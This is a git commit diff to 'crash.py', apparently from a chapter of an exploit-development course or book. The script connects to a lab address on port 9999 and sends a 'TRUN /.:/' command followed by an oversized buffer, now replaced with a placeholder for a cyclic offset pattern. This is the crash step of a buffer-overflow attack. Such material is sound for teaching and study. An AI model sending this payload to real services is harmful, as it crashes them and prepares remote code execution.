c664ca27010ee831de6b3f96525bedd1b335c8be
Vijay <vijayvkvelu@gmail.com>
2022-01-25 16:17:06 +0000

    Update crash.py

--- Chapter 10/crash.py
+++ Chapter 10/crash.py
@@ -1,8 +1,8 @@
-Import socket
+import socket
 s = socket.socket()
 s.connect(("10.10.10.4",9999))
 leng = 2984
-payload = [b"TRUN /.:/",b"A"*leng]
+payload = [b"TRUN /.:/",b"<PAYLOAD FROM PATTERNCREATE>"]
 payload = b"".join(payload)
 s.send(payload)
 s.close()
